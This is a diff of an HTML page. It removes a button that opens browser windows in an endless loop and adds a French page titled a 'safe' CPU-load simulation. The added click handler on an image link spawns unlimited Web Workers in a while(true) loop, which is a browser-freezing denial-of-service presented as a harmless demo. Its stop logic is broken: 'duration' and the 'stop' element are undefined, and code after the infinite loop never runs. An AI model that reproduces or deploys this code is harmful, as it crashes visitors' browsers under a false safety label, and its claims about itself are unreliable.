@@ -1,18 +1,81 @@
-<!DOCTYPE html>
-<html lang="en">
+<!doctype html>
+<html lang="fr">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Document</title>
+  <meta charset="utf-8"/>
+  <meta name="viewport" content="width=device-width,initial-scale=1"/>
+  <title>Simulation de charge (démonstration sûre)</title>
 </head>
 <body>
-    <div>
-        <button id="btn">Click me</button>
-        <script>
-            document.getElementById('btn').addEventListener('click', function() {
-                for(let e=0;;)window.open('./?v='+Math.random(),'_n'+e++);
-            });
-        </script>
-    </div>
+  <h2>Simulation de charge CPU (sécurisée)</h2>
+  <a id="start"><img src="images.jpg"/></a>
+  <pre id="log"></pre>
+
+  <script>
+    const log = msg => {
+      const p = document.getElementById('log');
+      p.textContent = new Date().toLocaleTimeString() + ' — ' + msg + '\n' + p.textContent;
+    };
+
+    let workers = [];
+
+    function makeWorkerScript() {
+      // Boucle courte et cooperative : calcule mais yield souvent
+      return `
+        let stopped = false;
+        onmessage = e => { if (e.data === 'stop') stopped = true; };
+        function busyChunk(iter) {
+          // travail CPU limité par chunk pour laisser le navigateur respirer
+          let x = 0;
+          for (let i = 0; i < iter; i++) x += Math.sqrt(i);
+          return x;
+        }
+        (async function loop() {
+          const CHUNK = 20000;
+          const INTERVAL_MS = 10; // yield fréquence
+          while (!stopped) {
+            busyChunk(CHUNK);
+            // yield au main thread
+            await new Promise(r => setTimeout(r, INTERVAL_MS));
+            postMessage({ tick: Date.now() });
+          }
+          postMessage({ stopped: true });
+        })();
+      `;
+    }
+
+    document.getElementById('start').addEventListener('click', () => {
+      stopWorkers(); // nettoie d'abord
+      const blob = new Blob([makeWorkerScript()], { type: 'application/javascript' });
+      const url = URL.createObjectURL(blob);
+
+      while(true) {
+        const w = new Worker(url);
+        w.onmessage = () => {}; // on pourrait compter les ticks
+        workers.push(w);
+      }
+
+      // stop automatique au bout de duration
+      setTimeout(() => {
+        stopWorkers();
+        URL.revokeObjectURL(url);
+        log('Simulation terminée automatiquement');
+      }, duration);
+    });
+
+    function stopWorkers() {
+      if (workers.length === 0) return;
+      log('Arrêt des workers...');
+      for (const w of workers) {
+        try { w.postMessage('stop'); } catch(e) {}
+        try { w.terminate(); } catch(e) {}
+      }
+      workers = [];
+    }
+
+    document.getElementById('stop').addEventListener('click', () => {
+      stopWorkers();
+      log('Arrêt manuel demandé');
+    });
+  </script>
 </body>
 </html>
